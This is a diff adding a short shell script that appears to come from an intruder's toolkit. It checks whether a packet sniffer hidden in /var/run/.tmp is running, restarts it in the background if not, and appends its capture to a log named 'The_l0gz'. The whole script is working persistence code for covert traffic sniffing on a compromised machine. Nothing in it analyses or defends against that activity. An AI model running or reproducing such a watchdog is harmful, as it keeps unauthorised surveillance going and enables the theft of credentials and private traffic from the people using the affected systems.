@@ -1,0 +1,23 @@
+#!/bin/sh
+
+# checks if your sniffer is running..
+
+# directory your sniffer is in
+dname="/var/run/.tmp"
+
+# name of your sniffer
+sname="sniffer"
+
+# file that your normally save your sniff-logs to
+lname="The_l0gz"
+
+if 
+pidof -s $sname >/dev/null
+then
+echo "Sniffer running."
+else
+echo "Restarting sniffer..."
+${dname}/${sname} >> $lname &
+echo "done."
+exit
+fi
